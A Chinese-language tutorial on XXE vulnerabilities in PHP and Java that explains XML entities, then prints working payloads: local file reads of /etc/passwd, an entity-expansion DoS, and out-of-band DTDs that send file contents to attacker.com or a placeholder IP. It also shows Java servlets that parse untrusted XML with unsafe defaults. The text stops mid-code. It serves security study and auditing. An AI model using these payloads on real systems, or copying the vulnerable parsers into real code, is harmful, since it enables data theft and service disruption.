@@ -1,0 +1,878 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="048cc88e40d401703296dc8e4bd80d06">PHP与JAVA之XXE漏洞详解与审计</h1>
+<p>​       其实之前也写过一篇<a href="https://2019/01/13/java审计之XXE.html" target="_blank">java审计之XXE</a>,虽然PHP与java XXE都大同小异但是本篇会更详细些，加入了PHP的归纳一些知识点和有关的一些函数，对之前的文章进行了整理与更新，从基础概念原理-&gt;利用-&gt;审计-&gt;防御。</p>
+<h2 data-content="1" id="26669ca4ae94e4dff02d5bfdf3021e71">1.xxe简介</h2>
+<p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。Java中的XXE支持sun.net.www.protocol里面的所有<a href="http://www.liuhaihua.cn/archives/tag/protocol" target="_blank">协议</a>：<a href="http://www.liuhaihua.cn/archives/tag/http" target="_blank">http</a>，<a href="http://www.liuhaihua.cn/archives/tag/https" target="_blank">https</a>，file，<a href="http://www.liuhaihua.cn/archives/tag/ftp" target="_blank">ftp</a>，<a href="http://www.liuhaihua.cn/archives/tag/mail" target="_blank">mail</a>to，jar，<a href="http://qclover.cn/2019/01/13/java%E8%87%AA%E5%AE%9A%E4%B9%89%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%88%A9%E7%94%A8.html" target="_blank">netdoc</a>  。一般利用file协议读取文件、利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p>
+<h2 data-content="1" id="8d7a452275d010badb91b17a9cf1ed20">2.相关基础概念</h2>
+<p><strong>XML&amp;DTD</strong></p>
+<p>​    XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据</p>
+<p>​    DTD(文档类型定义，<a href="http://www.liuhaihua.cn/archives/tag/document" target="_blank">Document</a> Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+<p><strong>实体ENTITY</strong></p>
+<p>​    XML中的实体类型，一般有下面几种：字符实体，命名实体（或内部实体）、外部实体（包含分为：外部普通实体、外部参数实体）。除外部参数实体外，其他实体都以字符（&amp;）开始以字符（；）结束。</p>
+<p><strong>DTD引用方式</strong></p>
+<p>a)DTD 内部声明</p>
+<p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p>b)DTD 外部引用</p>
+<p><code>&lt;!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI"&gt;</code></p>
+<p>c)引用公共DTD</p>
+<p><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI"&gt;</code></p>
+<p><strong>0x1:字符实体</strong></p>
+<p>​    字符实体类似html的实体编码，形如a(十进制)或者a（十六进制）。</p>
+<p><strong>0x2:命名实体（内部实体）</strong></p>
+<p>​    内部实体又叫命名实体。命名实体可以说成是变量声明，命名实体只能生命在DTD或者XML文件开始部分（&lt;!DOCTYPE&gt;语句中）。</p>
+<p>​    命名实体（或内部实体语法）:</p>
+<p><em>`&lt;!ENTITY 实体名称  "实体的值"&gt;</em>`</p>
+<p>如：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp">    &lt;!ENTITY x "First Param!"&gt;</span>
+    <span class="cp">&lt;!ENTITY y "Second Param!"&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;&lt;x&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/x&gt;&lt;y&gt;</span><span class="ni">&amp;y;</span><span class="nt">&lt;/y&gt;&lt;/root&gt;</span>
+</pre></div>
+<p>说明：</p>
+<p>定义一个实体名称x 值为First Param!</p>
+<p>&amp;x; 引用实体x</p>
+<p>知道以上语法后，可以使用名为foo的数据类型定义（DTD）构造如下请求:</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY bar "World"&gt;
+]&gt;
+&lt;foo&gt;
+  Hello &amp;bar;
+&lt;/foo&gt;</code></pre>
+<p>respone:</p>
+<div class="highlight"><pre><span></span>HTTP/1.0 200 OK
+
+Hello World
+</pre></div>
+<p>bar元素是单词“World”的别名 。看起来这样的内部实体似乎无害，但攻击者可以使用XML实体通过在实体内的实体内嵌入实体来导致拒绝服务攻击。通常被称为“ （Billion Laughs attack）<a href="https://en.wikipedia.org/wiki/Billion_laughs" target="_blank">十亿笑攻击</a> ”。某些XML解析器会自动限制它们可以使用的内存量。</p>
+<p>如：</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY bar "World "&gt;
+  &lt;!ENTITY t1 "&amp;bar;&amp;bar;"&gt;
+  &lt;!ENTITY t2 "&amp;t1;&amp;t1;&amp;t1;&amp;t1;"&gt;
+  &lt;!ENTITY t3 "&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;"&gt;
+]&gt;
+&lt;foo&gt;
+  Hello &amp;t3;
+&lt;/foo&gt;</code></pre>
+<p>response:</p>
+<pre><code>HTTP/1.0 200 OK
+
+Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World</code></pre>
+<p>0x3):外部<strong>普通实体</strong></p>
+<p>​    外部实体用于加载外部文件的内容。(显示XXE攻击主要利用普通实体)</p>
+<p>​    外部普通实体语法：</p>
+<p>​    <em><code>&lt;!ENTITY 实体名称 SYSTEM "URI/URL"</code></em></p>
+<p>如：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/xxe&gt;</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPe root [</span>
+<span class="cp">    &lt;!ENTITY outfile SYSTEM "outfile.xml"&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;&lt;outfile&gt;</span><span class="ni">&amp;outfile;</span><span class="nt">&lt;/outfile&gt;&lt;/root&gt;</span>
+</pre></div>
+<p>0x4):外部<strong>参数实体</strong></p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!ENTITY % 实体名称 "实体的值"&gt;</span>
+or
+<span class="cp">&lt;!ENTITY % 实体名称 SYSTEM "URI"&gt;</span>
+</pre></div>
+<p>​    参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符(;)结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。(Blind XXE攻击常利用参数实体进行数据回显)</p>
+<p>示例：</p>
+<p>1</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span>
+<span class="cp">&lt;!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd"&gt;</span>
+%xxe;]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;evil;</span><span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+<p>外部evil.dtd中的内容。</p>
+<p><code>&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini" &gt;</code></p>
+<p>2</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp">    &lt;!ENTITY % param1 "Hello"&gt;</span>
+    <span class="cp">&lt;!ENTITY % param2 " "&gt;</span>
+    <span class="cp">&lt;!ENTITY % param3 "World"&gt;</span>
+    <span class="cp">&lt;!ENTITY dtd SYSTEM "combine.dtd"&gt;</span>
+    %dtd;
+]&gt;
+<span class="nt">&lt;root&gt;&lt;foo&gt;</span><span class="err">&amp;</span>content<span class="nt">&lt;/foo&gt;&lt;/root&gt;</span>
+</pre></div>
+<p>combine.dtd的内容为：</p>
+<p><em><code>&lt;!ENTITY content "%parm1;%parm2;%parm3;"&gt;</code></em></p>
+<p>说明：</p>
+<p>上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。</p>
+<p>解析后<code>&lt;foo&gt;…&lt;/foo&gt;</code>中的内容为Hello World。</p>
+<h2 data-content="1" id="f74d99d4d6523940fa8ef232a7c94891">3.XML外部实体的一些限制与解决办法</h2>
+<p><strong>error</strong></p>
+<p>通常对于XXE的经典用法，用来读取文件比较直接方便，但是，也决定了能被解析的内容元素必须是XML文档。</p>
+<p>如下面一个例子：</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY bar SYSTEM
+  "file:///etc/fstab"&gt;;
+]&gt;
+&lt;foo&gt;
+  &amp;bar;
+&lt;/foo&gt;</code></pre>
+<p>response:</p>
+<p>通常会得到如下响应</p>
+<div class="highlight"><pre><span></span>HTTP/1.0 500 Internal Server Error
+
+File "file:///etc/fstab", line 3
+lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15...
+</pre></div>
+<p><code>/etc/fstab</code>是一个包含一些看起来像XML的字符的文件（即使它们不是XML）。这将导致XML解析器尝试解析这些元素，只是注意到它不是有效的XML文档。</p>
+<p>因此，这限制了XML外部实体（XXE）在以下两个重要方面。</p>
+<ul>
+<li>
+<p>XXE只能用于获取包含“有效”XML的文件或响应</p>
+</li>
+<li>
+<p>XXE不能用于获取二进制文件</p>
+<p><strong>XML外部实体（XXE）限制解决办法</strong></p>
+<p>​       这其实也就用到了外部参数实体，解决了命名实体和普通实体所带来的一些问题。具体如下分析：</p>
+<p>​      攻击者可以通过使用一些巧妙的技巧来解决上述限制。攻击者使用XML外部实体（XXE）攻击所面临的主要问题是，它很容易撞了南墙试图exfiltrate不是有效的XML文件（包含XML特殊字符，如例如，文件明文文件时<code>&amp;</code>，<code>&lt; and &gt;</code>）。</p>
+<p><strong>理论上的解决办法</strong></p>
+<p>​       XML已经解决了这个问题，因为有些合法的情况可能需要在XML文件中存储XML特殊字符。<code>CDATA</code>XML解析器忽略（Character Data）标记中的特殊XML字符。</p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;data&gt;</span><span class="cp">&lt;![CDATA[ &lt; " ' &amp; &gt; characters are ok in here ]]&gt;</span><span class="nt">&lt;/data&gt;</span>
+</pre></div>
+<p>因此，从理论上讲，攻击者可以发送类似于以下内容的请求。</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY start "&lt;![CDATA["&gt;
+  &lt;!ENTITY file SYSTEM 
+"file:///etc/fstab"&gt;
+  &lt;!ENTITY end "]]&gt;"&gt;
+  &lt;!ENTITY all "&amp;start;&amp;file;&amp;end;"&gt;
+]&gt;
+&lt;data&gt;&amp;all;&lt;/data&gt;</code></pre>
+<p>预期response:</p>
+<pre><code>HTTP/1.0 200 OK
+
+# /etc/fstab: static file system informa...
+#
+# &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; ...
+proc  /proc  proc  defaults  0  0
+# /dev/sda5
+UUID=be35a709-c787-4198-a903-d5fdc80ab2f... # /dev/sda6
+UUID=cee15eca-5b2e-48ad-9735-eae5ac14bc9...
+
+/dev/scd0  /media/cdrom0  udf,iso9660 ...</code></pre>
+<p>但实际上并不起作用，因为XML规范不允许将<strong>外部实体</strong>与<strong>内部实体</strong>结合使用。</p>
+</li>
+</ul>
+<p>内部实体代码示例：</p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe "test" &gt;]&gt;</code></pre>
+<p>外部实体代码示例：</p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre>
+<p>参数实体</p>
+<p>然而，攻击者仍然可以扔出手里的另一张牌—参数实体，在得到以上限制解决方法之前先理解一下以下两个重点：</p>
+<p>重点一：</p>
+<p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
+<p>还是以上代码</p>
+<pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre>
+<p>重点二：</p>
+<p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
+<p><strong>通用实体：</strong></p>
+<p>用 &amp;实体名:引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPe root [
+    &lt;!ENTITY outfile SYSTEM "outfile.xml"&gt;
+]&gt;
+&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;</code></pre>
+<p><strong>参数实体：</strong></p>
+<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 </strong><code>%实体名;</code> <strong>引用</strong><br/>
+(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br/>
+(3)和通用实体一样，参数实体也可以外部引用</p>
+<p><strong>示例代码：</strong></p>
+<pre><code>&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"&gt; 
+%an-element; %remote-dtd;</code></pre>
+<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
+<p>接下来怎么做？（解决办法）</p>
+<p>除了<strong>一般实体</strong>，这是我们到目前为止所看到的，还有<strong>参数实体</strong>。 以下是参数实体的外观。它与一般实体相同，除了它存在于DTD内部并以％作为前缀开始，以指示XML解析器正在定义参数实体（不是通用实体）。在下面的示例中，参数实体用于定义通用实体，然后在XML文档内部调用该实体。</p>
+<p>request:</p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % paramEntity
+  "&lt;!ENTITY genEntity 'bar'&gt;"&gt;
+  %paramEntity;
+]&gt;
+&lt;data&gt;&amp;genEntity;&lt;/data&gt;</code></pre>
+<p>预期的response:</p>
+<pre><code>HTTP/1.0 200 OK
+
+bar</code></pre>
+<p>考虑到上面的示例，攻击者现在可以通过创建在<strong>attacker.com/evil.dtd上</strong>托管的恶意DTD，将上面的理论CDATA示例转换为工作<strong>攻击。</strong></p>
+<p><strong>request:</strong></p>
+<pre><code>POST http://example.com/xml HTTP/1.1
+
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM
+  "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;</code></pre>
+<p><strong>攻击者DTD（attacker.com/evil.dtd）</strong></p>
+<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/fstab"&gt;
+&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;</code></pre>
+<p>解析：</p>
+<p>当攻击者发送上述请求时，XML解析器将首先<strong>%dtd</strong>通过向<strong><a href="http://attacker.com/evil.dtd" target="_blank">http://attacker.com/evil.dtd</a></strong>发出请求来尝试处理参数实体<strong>。</strong></p>
+<p>一旦下载了攻击者的DTD，XML解析器将加载<code>%file</code>参数实体（来自<strong>evil.dtd</strong>），在本例中是<code>/etc/fstab</code>。然后它将分别<code>&lt;![CDATA[ ]]&gt;</code>使用<code>%start</code>和<code>%end</code>参数实体将文件的内容包装在标签中，并将它们存储在另一个名为的参数实体中<code>%all</code>。</p>
+<p>这个技巧的核心是<code>%all</code>创建一个被调用的<strong>通用</strong>实体<code>&amp;fileContents;</code>，它可以作为响应的一部分包含在攻击者中。</p>
+<p>注:攻击者<strong>可以</strong>只使用DTD内参数实体，而不是内部的XML文档）</p>
+<p>结果是回复攻击者，文件（<code>/etc/fstab</code>）的内容包含在<code>CDATA</code>标签中。</p>
+<h2 data-content="1" id="b170dbca8105278c23761f95b888e2f1">4.利用方式总结</h2>
+<p><strong>1.有回显情况，</strong></p>
+<p>结合外部实体声明（实体名称 SYSTEM ”uri/url“）和参数实体（% 实体名称 SYSTEM "uri-外部dtd"）有两种方式进行注入攻击</p>
+<p>1</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span>
+<span class="cp">&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+<p>2</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span>
+<span class="cp">&lt;!ENTITY % xxe SYSTEM "http://xxx/evil.dtd"&gt;</span>
+%xxe;]&gt;
+<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;evil;</span><span class="nt">&lt;/foo&gt;</span>
+</pre></div>
+<p>外部evil.dtd的内容</p>
+<pre><code>&lt;!ENTITY %evil SYSTEM "file:///ect/passwd"&gt;</code></pre>
+<p><strong>2.无回显情况</strong></p>
+<p>可以使用外带数据通道提取数据，先用file://或php://filter获取目标文件的内容，然后将内容以http请求发送到接收数据的服务器（攻击服务器）</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE updateProfile[</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % dtd SYSTEM "http://xxx/evil.dtd"&gt;</span>
+%dtd;
+%send;
+]&gt;
+</pre></div>
+<p>evil.dtd的内容，内部的<code>%</code>号要进行实体编码成<code>&amp;#x25;</code>。</p>
+<pre><code>&lt;!ENTITY % all
+"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://xxx.xxx.xxx.xxx/?data=%file;'&gt;"
+&gt;
+%all;</code></pre>
+<h2 data-content="1" id="e260444041df217e98a5edb5bf13dd94">5.XXE审计函数</h2>
+<p>XML解析一般在导入<a href="http://www.liuhaihua.cn/archives/tag/%e9%85%8d%e7%bd%ae" target="_blank">配置</a>、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口（常见漏洞出现函数）如下：</p>
+<p><strong>JAVA</strong></p>
+<pre><code>javax.xml.parsers.DocumentBuilderFactory;
+javax.xml.parsers.SAXParser
+javax.xml.transform.TransformerFactory
+javax.xml.validation.Validator
+javax.xml.validation.SchemaFactory
+javax.xml.transform.sax.SAXTransformerFactory
+javax.xml.transform.sax.SAXSource
+org.xml.sax.XMLReader
+DocumentHelper.parseText
+DocumentBuilder
+org.xml.sax.helpers.XMLReaderFactory
+org.dom4j.io.SAXReader
+org.jdom.input.SAXBuilder
+org.jdom2.input.SAXBuilder
+javax.xml.bind.Unmarshaller
+javax.xml.xpath.XpathExpression
+javax.xml.stream.XMLStreamReader
+org.apache.commons.digester3.Digester
+rg.xml.sax.SAXParseExceptionpublicId</code></pre>
+<p><strong>PHP</strong></p>
+<p>使用不安全的XML解析函数，SimpleXMLElement、simplexml_load_string函数解析body</p>
+<h2 data-content="1" id="5d830958d484a497b4f191f581b932e3"><strong>6.XXE漏洞代码示例</strong></h2>
+<p><strong>JAVA</strong></p>
+<p>JAVA解析XML的方法越来越多，常见有四种，即：<a href="http://www.liuhaihua.cn/archives/tag/dom" target="_blank">DOM</a>、DOM4J、JDOM 和SAX。下面以这四种为例展示XXE漏洞。</p>
+<p>1）DOM Read XML</p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>      
+        <span class="n">String</span> <span class="n">result</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//DOM Read XML</span>
+            <span class="n">DocumentBuilderFactory</span> <span class="n">dbf</span> <span class="o">=</span> <span class="n">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>     
+            <span class="n">DocumentBuilder</span> <span class="n">db</span> <span class="o">=</span> <span class="n">dbf</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>                  
+            <span class="n">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+
+            <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">getValueByTagName</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span><span class="s">"username"</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">getValueByTagName</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span><span class="s">"password"</span><span class="o">);</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">USERNAME</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">password</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">PASSWORD</span><span class="o">)){</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParserConfigurationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">3</span><span class="o">,</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SAXException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">3</span><span class="o">,</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/xml;charset=UTF-8"</span><span class="o">);</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>2)DOM4J Read XML</p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>          
+        <span class="n">String</span> <span class="n">result</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//DOM4J Read XML</span>
+            <span class="n">SAXReader</span> <span class="n">saxReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXReader</span><span class="o">();</span>
+            <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">saxReader</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+
+            <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">getValueByTagName2</span><span class="o">(</span><span class="n">document</span><span class="o">,</span><span class="s">"username"</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">getValueByTagName2</span><span class="o">(</span><span class="n">document</span><span class="o">,</span><span class="s">"password"</span><span class="o">);</span>
+
+            <span class="k">if</span><span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">USERNAME</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">password</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">PASSWORD</span><span class="o">)){</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">1</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+                <span class="n">result</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
+            <span class="o">}</span>                
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">DocumentException</span>  <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
+        <span class="o">}</span> 
+        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/xml;charset=UTF-8"</span><span class="o">);</span>
+        <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>3)JDOM2 Read XML</p>
+<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doPost</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>             
+        <span class="n">String</span> <span class="n">result</span><span class="o">=</span><span class="s">""</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//JDOM2 Read XML    </span>
+            <span class="n">SAXBuilder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SAXBuilder</span><span class="o">();</span>  
+            <span class="n">Document</span> <span class="n">document</span> <span class="o">=</span> <span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+
+            <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">getValueByTagName3</span><span class="o">(</span><span class="n">document</span><span class="o">,</span><span class="s">"username"</span><span class="o">);</span>
